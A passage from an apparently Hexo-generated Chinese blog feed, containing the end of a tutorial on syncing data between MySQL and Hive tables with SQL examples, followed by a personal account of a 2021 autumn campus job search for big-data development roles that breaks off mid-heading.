PRIMARY <span class="hljs-keyword">KEY</span> (<span class="hljs-string">`id`</span>)) <span class="hljs-keyword">ENGINE</span>=<span class="hljs-keyword">InnoDB</span> AUTO_INCREMENT=<span class="hljs-number">4090</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">CHARSET</span>=utf8mb4 <span class="hljs-keyword">COMMENT</span>=<span class="hljs-string">'店铺gmv'</span></code></pre></div></li><li><p>创建Hive表</p><p>Hive表的创建与MySQL有点不一样，具体创建语句如下（推荐在MySQL建表语句的基础上做一些删减）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`hive_store_gmv`</span> (  <span class="hljs-string">`dt`</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'日期'</span>,  <span class="hljs-string">`store_id`</span> <span class="hljs-built_in">int</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'店铺ID'</span>,   <span class="hljs-string">`gmv`</span> <span class="hljs-built_in">int</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'该店铺当天成交金额总和'</span>) <span class="hljs-keyword">COMMENT</span>=<span class="hljs-string">'店铺gmv'</span></code></pre></div><p>很明显，这里删掉了MySQL字段的一些默认信息，并且去除了主键和选择的存储引擎</p><blockquote><p>MySQL建表语句改成Hive建表的一些常见处理：（在MySQL建表语句的基础上修改）</p><ol><li>删除DEFAULT NULL</li><li>删除自增id</li><li>删除主键</li><li>int(11)或int(10)改成int</li><li>varchar 改成string</li><li>datetime改成string</li><li>删除选择存储引擎和编码等信息</li><li>……</li></ol></blockquote></li><li><p>创建调度作业</p><p>这里的话如果有比较完善的数据平台会相对简单点</p><p>注意点：</p><ol><li><p>不能<code>SELECT * FROM tablename</code>（因为随着业务的发展，表很可能会增加字段）</p><p>正确的方式是该把需要同步的字段写出来，例如同步上表需要写成：</p><p><code>SELECT dt,store_id,gmv FROM mysql_store_gmv</code></p></li><li><p>需要加上不在当天重复调度的WHERE条件</p><p>这里需要考虑两个点，一个是对某天重复调度，所以需要考虑到触发作业后删除当天得到的数据；另一个就是非当天调度，比如在2021年9月12日这天跑过一次了，但是可能会2021年9月13日再触发一次这个同步作业</p></li></ol><p>所以我们需要写出这样，调度作业触发后执行以下SQL：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">-- 删除(删除Hive表的当天分区数据)</span><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> hive_store_gmv <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">PARTITION</span> (dt=<span class="hljs-keyword">CURDATE</span>());<span class="hljs-comment">-- 查询</span><span class="hljs-keyword">SELECT</span> dt,store_id,gmv <span class="hljs-keyword">FROM</span> mysql_store_gmv<span class="hljs-keyword">WHERE</span> dt &lt;= <span class="hljs-keyword">CURDATE</span>()<span class="hljs-comment">-- 插入（插入到Hive表的当天分区）</span><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hive_store_gmv <span class="hljs-keyword">PARTITION</span> (dt=<span class="hljs-keyword">CURDATE</span>())(dt,    store_id,    gmv)<span class="hljs-keyword">VALUES</span>($<span class="hljs-number">0</span>,$<span class="hljs-number">1</span>,$<span class="hljs-number">2</span>)<span class="hljs-comment">--三个字段</span></code></pre></div></li></ol><h2 id="增量同步采集"><a href="#增量同步采集" class="headerlink" title="增量同步采集"></a>增量同步采集</h2><p>增量同步基本上与全量同步处理方法一样有第二步和第三步</p><p>增量同步一般建议创建dt分区（日期作为分区）</p><p>增量同步需删除当天数据</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">-- 删除</span><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> hive_store_gmv <span class="hljs-keyword">WHERE</span> dt = <span class="hljs-keyword">CURDATE</span>()<span class="hljs-comment">--删除当天数据</span><span class="hljs-comment">-- 查询</span><span class="hljs-keyword">SELECT</span> dt,store_id,gmv <span class="hljs-keyword">FROM</span> mysql_store_gmv<span class="hljs-keyword">WHERE</span> dt = <span class="hljs-keyword">CURDATE</span>()<span class="hljs-comment">-- 插入（插入到Hive表的当天分区）</span><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hive_store_gmv <span class="hljs-keyword">PARTITION</span> (dt=<span class="hljs-keyword">CURDATE</span>())(dt,    store_id,    gmv)<span class="hljs-keyword">VALUES</span>($<span class="hljs-number">0</span>,$<span class="hljs-number">1</span>,$<span class="hljs-number">2</span>)<span class="hljs-comment">--三个字段</span></code></pre></div><h2 id="Hive表导入到MySQL表"><a href="#Hive表导入到MySQL表" class="headerlink" title="Hive表导入到MySQL表"></a>Hive表导入到MySQL表</h2><p>Hive表数据导入（数据采集）业务库MySQL表的步骤：(就Hive表和MySQL表反过来呗)</p><ol><li>找到Hive表，查看表结构或建表语句</li><li>创建MySQL表</li><li>创建调度作业</li><li>触发调度调度，核对数据</li></ol><h3 id="无自增id"><a href="#无自增id" class="headerlink" title="无自增id"></a>无自增id</h3><p>就跟采集那样，但是反过来</p><h3 id="有自增id"><a href="#有自增id" class="headerlink" title="有自增id"></a>有自增id</h3><p>如果MySQL有自增id，那Hive表里是不用管的（hive插入的时候不用插入id这个字段）</p><p>如果Hive表结构是这样的</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`mysql_store_gmv`</span> (  <span class="hljs-string">`dt`</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'日期'</span>,  <span class="hljs-string">`store_id`</span> <span class="hljs-built_in">int</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'店铺ID'</span>,   <span class="hljs-string">`gmv`</span> <span class="hljs-built_in">int</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'该店铺当天成交金额总和'</span>) <span class="hljs-keyword">COMMENT</span>=<span class="hljs-string">'店铺gmv'</span></code></pre></div><p>而MySQL又需要自增id，则MySQL建表语句是这样的（相比上面的例子，这里增加了id这个字段，注意后面的参数是<kbd>AUTO_INCREMENT</kbd>）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`mysql_store_gmv`</span> (  <span class="hljs-string">`id`</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> AUTO_INCREMENT,  <span class="hljs-string">`dt`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">25</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'日期'</span>,  <span class="hljs-string">`store_id`</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'店铺ID'</span>,   <span class="hljs-string">`gmv`</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'该店铺当天成交金额总和'</span>  PRIMARY <span class="hljs-keyword">KEY</span> (<span class="hljs-string">`id`</span>)) <span class="hljs-keyword">ENGINE</span>=<span class="hljs-keyword">InnoDB</span> AUTO_INCREMENT=<span class="hljs-number">4090</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">CHARSET</span>=utf8mb4 <span class="hljs-keyword">COMMENT</span>=<span class="hljs-string">'店铺gmv'</span></code></pre></div><p>Hive表插入到MySQL的语句如下（忽略id）：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hive_store_gmv <span class="hljs-keyword">PARTITION</span> (dt=<span class="hljs-keyword">CURDATE</span>()) (dt,    store_id,    gmv)<span class="hljs-keyword">VALUES</span>($<span class="hljs-number">0</span>,$<span class="hljs-number">1</span>,$<span class="hljs-number">2</span>)<span class="hljs-comment">--三个字段</span></code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据仓库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hive </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的秋招之路</title>
      <link href="/2021/09/30/%E6%88%91%E7%9A%84%E7%A7%8B%E6%8B%9B%E4%B9%8B%E8%B7%AF/"/>
      <url>/2021/09/30/%E6%88%91%E7%9A%84%E7%A7%8B%E6%8B%9B%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p><strong>《秋招的第一个大厂offer》—— 非科班双非渣本无大厂实习，6个月自学大数据终于找到工作的磕磕碰碰之路</strong></p><a id="more"></a><p>诚如标题，在今年9月底收到快手2022届校招意向书，岗位是数据研发工程师（杭州）。秋招期间在牛客上看了很多帖子，也在牛客上认识到了一些在我实习和秋招上帮助过我的朋友，所以挺感谢牛客这个平台，不喜欢发帖子的我也写一下这个有且只有一次的秋招经历吧，希望能帮助正在读研/即将读研的朋友以及之后秋招的本科学弟学妹们少走一些坑。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005181554.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h2><h3 id="不考研啦"><a href="#不考研啦" class="headerlink" title="不考研啦"></a>不考研啦</h3><p>3月份初，我和实验室里师弟的一次偶然谈话，才知道原来互联网资薪原来都是按16个月来算的了，之前我一直以为是13个月来着。。。师弟说：“时代变了，大人”</p><p>因为之前一直被家人亲戚怂恿考研，但是想想风险挺大的，如今发现互联网资薪还挺高，此前我以为互联网资薪的水平还停留在17年10月~18年4月那时候的资薪，也就是我高考那一届的秋招，一打听才知道腾讯去年白菜价的年包已经是3年前的1.6倍左右了（白菜价：指校招里最低档次的那一批价格；比白菜价格高批次一般称为sp、ssp）。</p><p>两相比较一下，觉得其实收益都差不多，但是考研风险还挺大（没考上直接无了，工作去不了大厂还能去小厂），立马准备工作！！！</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005180934.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="地狱难度开局"><a href="#地狱难度开局" class="headerlink" title="地狱难度开局"></a>地狱难度开局</h3><p><strong>双非本科</strong>嘛，那算法、数据挖掘这种岗位肯定没法投；我还是<strong>统计学</strong>专业的（高考的时候信了营销号的鬼话，读数学转计算机，其实这几个压根没多大关系），那开发岗这种难搞哦（虽然之前自学过点数据结构、也刷了点算法题，但基本上都忘光了），看了一圈发现好像只能投数据分析岗。</p><p>（这里提醒一下，要想好找工作，还是建议把数据结构、计网这些基础学好，具体案例下文会说）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004115444.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>然后我就一直在投“数据分析”这个岗，但是在这期间我发现很多国外学校例如卡耐基梅隆、新加坡国立、帝国理工，和国内985的研究生在投这个岗位，而且“数据分析”这个岗位投录比通常是几百：1，于是投了几十家知名互联网公司，但3月份之后知名互联网公司实习的面试次数是：<strong>0</strong> 。。。</p><p>（感觉是因为疫情原因，导致很多留学生只能在国内找实习和工作，以国内的数据分析岗数量来说无法承载留学生工作岗位数量需求，这也是为什么在我大一大二的时候明明这个岗位还不怎么卷，当时连双非都能在数据分析找到挺好的工作，但是在我大三也就是疫情之后已经卷到海外名校硕士了。就业形势每年都会不一样，比如前两年很卷的算法岗现在其实也没那么卷了）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004115549.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>找实习期间我也把技能优先级顺序搞错了，例如“数据分析”最重要的是SQL，但是我把机器学习方面的知识练得挺熟，故公司的笔试都GG了。。。（这里再次告诫一定要知道哪些是必备的基础项，哪些是加分项，基础项要求的能力过不了，加分项再牛逼也没用）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004115616.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="接受现实"><a href="#接受现实" class="headerlink" title="接受现实"></a>接受现实</h3><p>期间有投过一些小公司，但是发现这个岗位好像都很奇怪，有些是做报表数据处理的，有些是用mysql的，有些是做客服的。。。因为小公司一般都要求线下面试，当时我还傻傻地跑去了很多公司参加线下面试了，后来想想就应该直接不去面试这些小公司的（关键是很多小公司的面试我都过不了。。。主要原因还是因为当时确实SQL都不会写了，算法也拉跨得离谱）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005181449.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>综合考量了一下，发现自己投数据分析肯定进不了大厂（很不愿意接受这个事实，但又不得不接受），毕竟名校学生投数据分析都很艰难，我这种双非本简历挂倒也正常。。。所以决定转投录比没那么恐怖的数据开发岗。3月底我开始整理Hadoop、spark这些大数据框架的笔记，冒出来投数据开发的想法。我当时的想法是：反正数据分析连知名公司的面试机会都没有，死马当活马医多点些技能，我两种岗位一起投了。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004115644.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>在后来的经历和反思中，我很庆辛当时<strong>果断</strong>地换方向了。（对于任何一个人来说，让他抛掉八成以上的知识储备再去学新的东西，尤其还是别人已经拿到了offer而自己还在焦虑地准备的时候，这个决定都是很难做出的。不过当时我想起了《计算广告》的作者——科大讯飞副总裁 刘鹏先生，在他的微信公众号的文章中写道关于学习能力的一种我认为很准确的描述：<strong>果断放弃某些知识的能力！而这，才是学习能力的根本！</strong>）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211006021854.png" srcset="/img/loading.gif" lazyload="" width="40%"></p><h2 id="4月"><a href="#4月" class="headerlink" title="4月"></a>4月</h2><h3 id="转向开发"><a href="#转向开发" class="headerlink" title="转向开发"></a>转向开发</h3><p>4月1日，愚人节当天，我已经忘了我投过多少家公司，只记得当时还在学校刷<strong>leetcode算法题</strong>和<strong>牛客SQL题</strong>（数据开发挺注重SQL的，SQL题写不出来直接GG），当时甚至刷算法刷到过于激动睡不着通宵刷题。大一大二的时候没怎么刷过算法题，但是到了该找实习不得不刷，我记得那段时间刷题效率是真的高。。。另外背了一两万字的大数据Hadoop、Spark的八股。</p><p>（八股：面试八股文的简称，指面试中已经形成了标准的问答套路，对应的问题有着对应的标准答案。我也是3月底才知道八股这么一说，面试一般会按照简历来问问题，建议看看牛客面经总结一下常见问题，日常反复吟诵八股）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004115719.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h3><blockquote><p>tip ~ <strong>实习面试</strong>三法宝（后面还有秋招面试）：</p><p>1、<strong>题</strong>（数据开发岗包括算法题、SQL题，不同岗位会有不同的题）</p><p>2、<strong>八股</strong></p><p>3、自己做的辣鸡<strong>项目</strong>但还是得有并且能说明白的玩意</p><p>（比较标准的面试流程是开局先自我介绍，然后吟唱八股，如果面试官感兴趣就问下项目，最后做题~</p><p>顺序可能有更改，看面试官风格）</p><p>从这里可以看出来题和八股是优先级最高的，尤其是题（因为八股至少还有可解释空间而且一般多少能说得上来点，但题对就对、错就错）</p></blockquote><p>4月上旬投了广州以前做直播的一个公司的数据开发岗，第一次面试开发岗，答得很烂，我甚至最后的题都不会，面完之后发了个短信给面试官自己的解决方案（因为面试前面试官给我打了电话）。</p><p>本来以为面试凉了，当天早上我还在BOSS直聘继续投简历的（实习海投简历，基础操作了），但是很意外地接到了面试通过的电话，HR问我有没有时间，我说有就来了十几分钟的HR面。然后约定入职时间，体验，入职……开启我的实习之旅</p><p>挺离谱的，认真准备了很久投递的“数据分析”，凉了；随便准备了一下投数据开发，面试却过了，魔幻。。。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004115813.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="新奇"><a href="#新奇" class="headerlink" title="新奇"></a>新奇</h3><p>当然，刚入职的时候接触到了很多新的东西，遇到了很好的导师和同事。</p><p>刚开始也因为某些事情不知道怎么做慌过，但总的来说都还行……</p><p>诶，经常看到导师上班在刷抖音、跟他老婆聊天、看女装给他老婆买衣服，挺爽的（这不比在实验室苦逼搬砖还没钱爽多了？我羡慕极了.jpg）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004115840.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="5月"><a href="#5月" class="headerlink" title="5月"></a>5月</h2><h3 id="摸鱼"><a href="#摸鱼" class="headerlink" title="摸鱼"></a>摸鱼</h3><p>4月中旬入职，来了实习之后就有点得意忘形了，觉得自己刷题两周就能找到过得去的实习，照着势头秋招进大厂岂不是妥妥的（这里开始飘了）。</p><p>于是我每天上班时间都在刷知乎、脉脉，中午休息时间和晚上自愿加班时间都在打游戏（自愿呆在公司打游戏，只为蹲到明天可以11点再上班）……</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211006022210.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="彷徨"><a href="#彷徨" class="headerlink" title="彷徨"></a>彷徨</h3><p>天天摸鱼心里也会慌，有空的时候我也会在各种渠道（牛客、脉脉、知乎）这些了解数据开发这个岗位。</p><p>对于数据开发岗，5月份我开始了对这个岗位的审视（感觉这个词不太妥当，毕竟我是菜鸡一枚，但是先这样写吧），因为我发现每天的工作其实也就那样，觉得是不是这种招谁来都会做咧（后来发现并不是，至少找后端的同学是不会或者做不好的）</p><p>我也会观察正式员工们做的工作，又在脉脉上看相关的帖子（问就是劝退，后端才是人上人，大数据都是sql boy），挺迷茫的吧，而且发现很多公司校招其实是没有对口的岗位的。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005180522.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="6月"><a href="#6月" class="headerlink" title="6月"></a>6月</h2><h3 id="试图跑路"><a href="#试图跑路" class="headerlink" title="试图跑路"></a>试图跑路</h3><p>实习了两个多月了，快要期末考的6月下旬（所以压根没准备过面试），请假3个星期回学校准备期末考。</p><p>某一天下午通过脉脉上加了一位在字节跳动TikTok业务线的大佬，岗位方向对口，我以为可以迟点约面试，于是在完全没有准备的情况下就把简历发过去了。然后很快地就约了面试……（因为岗位base是杭州，而且加上在准备期末考，所以约完面试后我没在复习八股也没刷题，而是在看杭州房价。。。看着离谱，但现在想想其实那也只是当时压力大的一种宣泄罢了）</p><p>面试不出意外，我被毒打了一遍，面得我想找个地方钻进去（八股不会，题也做不出。。。）跑路失败，只能继续在原公司实习。。。</p><p>被毒打之后痛定思痛，决定以后不再摸鱼，好好学习</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005175001.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="7月"><a href="#7月" class="headerlink" title="7月"></a>7月</h2><h3 id="秋招前的琐事"><a href="#秋招前的琐事" class="headerlink" title="秋招前的琐事"></a>秋招前的琐事</h3><p>因为疫情原因，暑假学校不给住了，所以又得外面租房</p><p>7月份的时候比赛拿了个奖，诶，注意力有点被拉过去了，而且论文需要搞完投稿了，又浪费了一段时间</p><p>还有一些别的事……emmm，想不起来了，我只记得当时的状态是很放松的，可能是觉得秋招还不急，虽然很多大厂已经开了</p><p>（事实上，现在秋招已经金七银八了，我看了牛客很多七月份的面经，相对来说还是比较简单的，但这样都拿到意向了，说明早投真的很有优势~当然早投的前提是你有实力能过基础关，如果连基础要求都达不到则建议按自己的节奏继续准备）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005175204.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="秋招提前批"><a href="#秋招提前批" class="headerlink" title="秋招提前批"></a>秋招提前批</h3><p>关于秋招提前批，今年最早开的是vivo，我记得6月中旬就截至投递了（是的，中旬已经截至投递了）。</p><p>关于提前批，因为不用笔试，而且流程会走的比较快，竞争对手的题和八股能力也没秋招的那么强，个人建议是能投就投。但要注意的一点是：<strong>如果你没准备好，就别一下子把所有想去的公司都投了</strong>，不然到时候留下差的面评，说不定秋招面试机会都没有（每家公司HR都说提前批不影响正式批投递，是的，不影响正式批投递，但是影响正式批有没有机会面试）</p><blockquote><p>tip ~ <strong>秋招面试</strong>三法宝：</p><p>1、<strong>题</strong>（提前批就算免笔试，面试的时候也还是得补上的）</p><p>2、<strong>八股</strong></p><p>3、<strong>实习项目</strong>（这里建议简历里加上自己在实习公司里接触过的比较重要的项目，不一定需要优先级高的需求，最好是和理论知识紧密结合的项目）</p></blockquote><p>收拾完一堆乱七八糟的事开始准备面试，从实习到秋招，所有电话打来的面试预约我都是直接让对方定时间的（因为我面试机会真的太少了，卑微到连时间都不敢麻烦对方推后一点，虽然很多时候我都处于完全没准备的状态）</p><ul><li><p>触宝科技一轮游</p><p>提前批投了一个叫触宝科技的公司，八股还是答不上来，题也没做出来，秋招提前批第一面，卒</p><p>（不过这个面试有点离谱，面试官挺年轻的，问我接触过的数据量最大的是多少，我说接触过最大的库大小是2PB。他说他们那里很多单表就2PB了。。。）</p></li><li><p>京东集团一轮游</p><p>另外有面试机会的是京东集团的数据服务，先问了问我Hadoop的一些原理，答不上上来（或者说答得太烂了），GG。。。另外，因为我简历上写着：了解spark、kafka原理，而且之前的Hadoop原理我答得实在太烂了，所以出现了以下名场面：</p><blockquote><p>面试官：“Spark我能问吗？”</p><p>我：“不能”</p><p>面试官战战兢兢地说：“Kafka呢？我能问吗？”</p><p>我：“哈哈哈，不能……”（此时我的节操已经碎了一地）</p><p>（面试官很无奈）</p></blockquote><p>面试官人挺好，就是他那边有点吵。。。半小时后京东流程结束</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004115345.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="面试总结"><a href="#面试总结" class="headerlink" title="面试总结"></a>面试总结</h3><p>经过提前批的两次秋招预训练（虽然知道会是炮灰，不过一轮面试都没挺过去属实挺惨），总结了下：</p><ul><li>我发现面试是按照简历来问的，如果时间不够，学很多框架还不如把一个掌握好，至少面试还能顺利回答</li><li>别写熟悉某个很泛的东西（比如别写熟悉某个框架），正确的是该写熟悉某个框架的某几个比较重要的部分</li><li>刷题很重要，题做不出来基本上会挂</li></ul><p>然后针自己的情况，以及一次实习和两次提前批的失败面经，修改了自己的简历，也制定了秋招复习的方案</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004120535.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="8月"><a href="#8月" class="headerlink" title="8月"></a>8月</h2><h3 id="KPI面"><a href="#KPI面" class="headerlink" title="KPI面"></a>KPI面</h3><ul><li><p>虎牙</p><p>之前投递的虎牙提前批，突然被虎牙改成正式批了，因为我想慢慢准备到后面面试，所以预约面试的时候我选了最后的那天（感觉不应该选最后一天的，应该选早点，因为如果招的人满了后面的人会挂掉的）。</p><p>8月下旬虎牙一面，电话面，电话十几分钟（除了某个知识点有点零散，其他都答上来了）。面完后还很高兴地跟朋友说：”就这？这么简单”</p><p>周五面完下周二感谢信，看牛客另一个老哥也是跟我同一天收到感谢信</p><p>虎牙这个岗位是对口的，但是连虎牙我都过不了，所以我当时挺崩溃的。。。</p></li><li><p>陌陌</p><p>此外还面了陌陌，没问八股，但是做了三道SQL题，都做出来了但还是挂了。</p><p>面试官劝我把算法练好，不然校招很吃亏。。。陌陌面试官看我简历一堆机器学习相关的，他说：“什么阶段就该干什么阶段该干的事，机器学习这些对高级数据开发来说可能是需要掌握的，但是你这个时间点更应该打好基础（比如练好算法、学好Java、掌握好大数据框架原理、有空看看框架源码）”。我觉得他说的很对（想想自己大学期间搞过一堆花里胡哨的东西，确实得不偿失）。。。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004120421.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="试图实习跳槽"><a href="#试图实习跳槽" class="headerlink" title="试图实习跳槽"></a>试图实习跳槽</h3><p>当时我觉得因为我是双非本学历+实习公司只是个几千人小厂的缘故，所以没啥面试机会。所以期间我还在BOSS直聘上找了一些实习投递，期间又面过腾讯IEG的数据分析实习，以及滴滴的数据开发实习</p><p>（后来发现其实秋招期间没必要再去找实习了，还是把基础功练好，把实习干的活整明白就行了）</p><ul><li><p>腾讯IEG</p><p>对面没开摄像头，几道SQL题不难，感觉是招个取数工具人，做完题后告诉我是日常实习，实习资薪一天200。。。（原来腾讯非官方渠道找的都是绿牌日常实习。。。）……搞得我面试白紧张了</p><p>之后没消息了</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211007024916.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li><li><p>滴滴</p><p>我投的是数据开发，然后HR小姐姐说是数据分析，面试的时候面试官说是数据开发（不知道咋回事，面试官说是因为招不到合适的且有5年经验的数据分析，所以招个数据开发实习生来）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211007130509.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>面完感觉面试官觉得我方向跟他们不match，题都没考了，我问面试官为啥不出题，他说看我简历稳得很，没必要（综合后来的面试，我发现题都没考其实就是不想招了）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211007025057.png" srcset="/img/loading.gif" lazyload="" alt="大受震撼.jpg"></p></li></ul><h3 id="吃了学历的亏"><a href="#吃了学历的亏" class="headerlink" title="吃了学历的亏"></a>吃了学历的亏</h3><p>在牛客和实习群加到在阿里淘系、美团到家实习生的微信，都是一听我是双非本科生就顿时感到尴尬了……（都说同组的里没见过本科生）美团老哥表示帮我问问，但是8月下旬他说：“leader说不收校招生简历了”（？？？8月份就不收简历了）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004120625.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="投递简历"><a href="#投递简历" class="headerlink" title="投递简历"></a>投递简历</h3><p>8月下旬投简历，其实我还想迟点再投的，但是大家都说这个时间点已经很迟了。（是的，秋招已经快结束了，以前说是金九银十，现在已经是金七银八了）</p><p>而且秋招提前批大厂的很多HC已经被占了，正式批基本上很少了，以至于后来我在实习群里看到了这么扎心的一句话：</p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211002005518.png" srcset="/img/loading.gif" lazyload="" width="50%"><p>注意秋招一定要早准备早投（投的早只要你基础过关就能过面试，如果没HC了你再牛逼都会在流程中面着面着就挂了）</p><h3 id="要不跑路吧"><a href="#要不跑路吧" class="headerlink" title="要不跑路吧"></a>要不跑路吧</h3><p>8月21日左右我想过要不不搞数据开发了吧，但也就想想。</p><p>8月底我很认真地在想要不要再转一次岗位，转测试开发？转客户端？（因为相对来说这两个岗位确实没那么卡学历）也拜托朋友找了下在微信、快手做测开的朋友，问了下他们什么情况。</p><p>在这之前已经有和我一起投数据开发的本科同学转投字节客户端了，但是因为非科班的原因我又确实没法转（计网、操作系统这些我是真不会，以前学过点也忘了，虽然大厂招人不会歧视非科班，但是非科班的劣势真的太明显了）。。。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004115311.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="9月"><a href="#9月" class="headerlink" title="9月"></a>9月</h2><h3 id="秋招第一次大厂面试"><a href="#秋招第一次大厂面试" class="headerlink" title="秋招第一次大厂面试"></a>秋招第一次大厂面试</h3><ul><li><p>快手</p><p>我投递的是杭州的数据研发岗，面试流程很快（注意，快的仅仅是面试流程，之后还要泡很久的池子），都是当天或者隔天约下一面。9月1日约面（其实前一天也给我打电话了，但是当时手机静音了没接到~这里注意秋招期间手机不要静音，因为一般公司打来的都是开了来电转接，所以你打不回去），9月8日面完HR面，HR说要等所有同学面完横向对比。</p></li><li><p>阿里云</p><p>当时和快手时间接近的面试是阿里云的Ecs弹性计算数据团队，但是因为感觉岗位方向不对口，面试简历面之后我没问结果也没做阿里笔试了，虽然阿里后面还有两个志愿，但秋招与阿里就此别过吧（累了，不想做笔试了，不想面了）。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005175055.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="不知名小公司练不了手"><a href="#不知名小公司练不了手" class="headerlink" 